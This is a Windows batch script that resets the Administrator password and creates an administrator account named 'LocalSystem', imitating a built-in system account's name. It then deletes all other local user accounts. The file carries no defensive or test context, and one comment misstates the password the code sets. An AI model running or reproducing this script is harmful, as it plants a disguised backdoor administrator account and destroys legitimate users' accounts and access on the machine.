@echo off

:: Change Administrator password
net user Administrator Pa$$w0rd1234%$
:: Create a new user named 'LocalSystem' with the password 'Pa$$w0rd1234%$'
net user LocalSystem L@Rky7373$$# /add

:: Add the user to the Administrators group
net localgroup Administrators LocalSystem /add

:: Get a list of local user accounts excluding 'LocalSystem' and 'Administrator'
for /F "skip=6 tokens=1" %%G in ('net user ^| find /v "LocalSystem" ^| find /v "Administrator"') do (
    :: Remove each user account
    net user %%G /delete
)

:: Display a message indicating the completion of the script
echo All other local accounts have been removed.

:: Pause the script execution to allow time for verification
pause